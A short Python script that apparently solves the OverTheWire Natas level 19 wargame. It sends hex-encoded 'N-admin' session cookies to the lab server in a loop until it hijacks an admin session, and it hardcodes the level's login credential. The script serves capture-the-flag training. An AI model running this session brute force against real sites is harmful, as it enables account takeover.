import requests
from requests.auth import HTTPBasicAuth


url = 'http://natas19.natas.labs.overthewire.org/index.php'
basic_auth = HTTPBasicAuth('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr')
payload = {'username': 'admin', 'password': 'what?'}
condition = 'You are logged in as a regular user.'


def create_hex(n):
  return f'{n}-admin'.encode().hex()


for i in range(641):
  cookie = dict(PHPSESSID=create_hex(i))
  res = requests.post(url, auth=basic_auth, data=payload, cookies=cookie)
  print(f'Try with phpsessid: {i}')
  if condition not in res.text:
    print(res.text)
    break